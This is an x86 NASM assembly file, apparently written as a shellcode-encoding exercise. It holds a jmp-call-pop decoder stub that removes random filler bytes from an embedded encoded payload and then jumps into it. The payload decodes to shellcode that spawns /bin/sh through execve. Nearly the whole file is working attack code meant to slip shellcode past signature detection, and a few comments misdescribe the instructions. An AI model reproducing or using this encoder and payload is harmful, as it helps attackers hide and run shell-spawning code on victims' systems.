; Filename: double_random_insertion-decoder.nasm
; Author: evil_comrade
;
; Purpose: Removes two random x-ters between the legitimate shellcode
; works with random_double_insertion.py

global _start			

section prog write exec
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +2]             ; make edi point to the first nonsense x-ter
	xor eax, eax		 
	mov al, 1		      ; load 1 into eax
	xor ebx, ebx

decode: 
	mov bx, WORD [esi + eax +1]   ; move the first bogus x-ter into ebx register 
	xor bx, 0xffff                ; xor ebx (0xff,0xff) to check and make sure its a zero
	jz short EncodedShellcode     ;this flag ensures that the zero flag is set and is a signal                              ;to the end of the decoding process since
	mov bx, WORD [esi + eax + 3]  ; this initially moves 0xc0 to bl (ebx)
	mov WORD [edi], bx            ; bl is then moved to edi
	inc edi			      ; increase edi twice so that it points next byte (0x50) in shellcode
	inc edi
	add al, 4		      ; eax is then increased by 2 so as to point to the next bogus x-ter
	jmp short decode	      ; jumps backwards to continue the decoding

; once the zero flag is set, it signals the end of the decoding process. Thats the point of the 
; two 0xffs at the end of the encoded shellcode 
; we use two values one to keep track of the bogus random x-ters as we move along and the other to move along
call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0xc0,0x4e,0x79,0x50,0x68,0x81,0x2e,0x2f,0x2f,0x59,0x85,0x73,0x68,0x90,0xd1,0x68,0x2f,0x69,0x66,0x62,0x69,0x0a,0xde,0x6e,0x89,0xb7,0x62,0xe3,0x50,0xb8,0xb8,0x89,0xe2,0xc6,0xcd,0x53,0x89,0x94,0x72,0xe1,0xb0,0x04,0x52,0x08,0x40,0x60,0xd5,0x40,0x40,0xfb,0x47,0xcd,0x80,0xd2,0x98,0xff, 0xff



